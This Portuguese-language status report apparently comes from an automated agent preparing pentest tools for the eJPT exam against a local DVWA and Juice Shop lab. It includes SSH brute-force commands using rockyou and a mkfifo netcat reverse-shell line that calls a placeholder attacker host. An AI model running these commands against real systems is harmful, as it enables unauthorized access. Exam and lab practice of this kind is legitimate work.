# Status das Ferramentas — eJPT
Verificado em **2026-10-14 16:11** (véspera do exame), com testes de execução REAIS, não só `--version`.

Ambiente de APOIO do LIBERTUS (Ubuntu do Lorran). No exame o Kali é fornecido pela INE via browser — lá tudo é completo. Este arsenal é o que LIBERTUS usa pra simular/validar antes e durante.

---

## Núcleo do exame

| Ferramenta | Caminho | Versão | Status | Teste real feito |
|-----------|---------|--------|--------|------------------|
| **nmap** | /snap/bin/nmap | 7.991 | ✅ OK | `nmap -sT -p 22,80,3000,8080 127.0.0.1` → achou 3000/8080 open. NSE completo (`smb-vuln-ms17-010`, `ssh-brute` presentes via `--script-help`) |
| **msfconsole** | /snap/bin/msfconsole | 6.4.126-dev | ✅ OK | `search` achou `ms17_010_eternalblue`, `vsftpd_234_backdoor`, `ssh_login`, `autoroute`, `socks_proxy`. Aviso ">2 semanas" é cosmético |
| **hydra** | /usr/local/bin/hydra | v9.8dev | ⚠️ PARCIAL | **Sem módulos SSH/SSL** (ver gap abaixo). FTP e HTTP funcionam |
| **gobuster** | /home/libertus/go/bin/gobuster | 3.8.2 | ✅ OK | Rodou contra DVWA:8080 → achou /config, /docs, /external, /php.ini, robots.txt |
| **sqlmap** | /snap/bin/sqlmap | 1.8.12#pip | ✅ OK | Rodou contra DVWA (não injetável sem sessão — esperado). Detecção/extração funcionam |
| **netcat** | /usr/bin/nc | OpenBSD nc 1.226 | ✅ OK | Banner grab em 127.0.0.1:3000 OK. Variante BSD: **sem `-e`** → usar reverse shell via mkfifo |
| **john** | /usr/local/bin/john | John jumbo | ✅ OK (via wrapper) | **Quebrou hash sha512crypt de verdade** → `user:password`. Sempre chamar via `jl.sh` |
| **sshpass** | ~/.local/bin/sshpass | 1.10 | ✅ OK (NOVO) | Compilado do source hoje 16:11 pra cobrir o gap de SSH do hydra |

## Arsenal extra disponível

| Ferramenta | Caminho | Versão | Nota |
|-----------|---------|--------|------|
| **nuclei** | ~/go/bin/nuclei | v3.9.0 | Templates em ~/nuclei-templates |
| **ffuf** | ~/go/bin/ffuf | 2.1.0 | Fuzzing rápido de dirs/params |
| **gobuster** | ~/go/bin/gobuster | 3.8.2 | dir/vhost/dns/fuzz |
| **subfinder** | ~/go/bin/subfinder | v2.14.0 | Enumeração de subdomínios |
| **nikto** | /usr/local/bin/nikto | 2.6.1 | Fonte (git /opt/nikto), SSL funcionando |
| **sshpass** | ~/.local/bin/sshpass | 1.10 | Bruteforce SSH (ver sshbrute.sh) |

**Ausentes:** wpscan, whatweb, ncat, medusa, ncrack, proxychains, responder, exploitdb/searchsploit.
- **searchsploit ausente** → usar https://www.exploit-db.com pelo navegador, ou `msfconsole search` (tem centenas de exploits).
- **proxychains ausente** → para eJPT, usar `auxiliary/server/socks_proxy` do MSF + `route add`/`autoroute` (não exige proxychains no host).

---

## ⚠️ GAP PRINCIPAL: hydra sem SSH

`hydra -h` mostra: *"These services were not compiled in: afp firebird memcached mongodb mysql5 ncp oracle postgres radmin2 rdp sapr3 **ssh sshkey** svn smb2 SSL-services (ftps, sip, rdp, oracle-services, ...) and regex support."*

O binário local foi compilado sem `libssh-dev`. **Não dá pra corrigir sem sudo** (sudo exige senha; nenhum humano presente nesta sessão de cron).
- **No exame isso NÃO importa** — o Kali da INE tem hydra completo com SSH.
- **Localmente**, usar os fallbacks abaixo (todos testados funcionando):

### Fallback 1 — MSF ssh_login (nativo, embutido)
```bash
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS IP; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; set STOP_ON_SUCCESS true; set THREADS 4; run"
```
Após achar: `sessions -l` → `sessions -i 1`.

### Fallback 2 — nmap ssh-brute
```bash
nmap -p22 --script ssh-brute --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt IP
```

### Fallback 3 — sshbrute.sh (wrapper sshpass, criado hoje)
```bash
bash ~/LIBERTUS/ejpt/sshbrute.sh IP [USER] [WORDLIST]
# ex: bash ~/LIBERTUS/ejpt/sshbrute.sh 192.168.100.10 auditor /usr/share/wordlists/rockyou.txt
```

**Fix definitivo (quando o Lorran estiver presente e puder digitar a senha do sudo):**
```bash
sudo apt install -y libssh-dev
cd /tmp && git clone https://github.com/vanhauser-thc/thc-hydra.git && cd thc-hydra
./configure && make -j$(nproc) && sudo make install
hydra -h | tail -3   # 'ssh' deve sair da lista de 'not compiled in'
```

---

## John — usar SEMPRE via wrapper
Binário direto dá "Cannot find John home". Wrapper testado hoje (quebrou sha512crypt):
```bash
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt --format=sha512crypt
bash ~/LIBERTUS/ejpt/john_home/jl.sh hash.txt            # auto-detecta
bash ~/LIBERTUS/ejpt/john_home/jl.sh --show hash.txt
```
Formatos úteis: `sha512crypt` (Linux /etc/shadow), `NT` (NTLM Windows — `hashdump`), `bcrypt`, `ssh` (chaves via ssh2john), `raw-md5`.

## Netcat — variante BSD (sem `-e`)
Listener: `nc -lvnp 4444`
Reverse shell Linux sem `-e`:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATACANTE 4444 >/tmp/f
```
No Kali da INE o nc/ncat tem `-e` normalmente.

## Wordlists locais
- `/usr/share/wordlists/rockyou.txt` — 14M senhas, descomprimido ✅
- `/usr/share/wordlists/common.txt` — dirs web (38KB) ✅
- Rules do John: `~/LIBERTUS/ejpt/john_home/rules/` (ex: rockyou-30000.rule)
- **No Kali da INE:** rockyou vem `.gz` → `gunzip /usr/share/wordlists/rockyou.txt.gz` antes. common.txt NÃO existe lá → usar `/usr/share/wordlists/dirb/common.txt` ou `fasttrack.txt`.

## Lab local (docker) — ONLINE hoje
| Alvo | URL | Status teste |
|------|-----|--------------|
| DVWA | http://localhost:8080 | ✅ HTTP 302 → login.php (admin/password). Container `libertus-dvwa` UP |
| Juice Shop | http://localhost:3000 | ✅ HTTP 200. Container `libertus-juiceshop` UP |

Comando: `cd ~/LIBERTUS/lab && docker compose up -d dvwa juiceshop`

---

## Veredito
**Arsenal pronto para o exame.** Tudo executa. Dois ajustes documentados:
1. **John** só via wrapper `jl.sh` (validado).
2. **hydra local sem SSH** → usar MSF `ssh_login` / `nmap ssh-brute` / `sshbrute.sh`. Fix real quando houver sudo.

No Kali da INE (ambiente do exame) todas essas ferramentas são completas — os fallbacks são só para o apoio local do LIBERTUS.
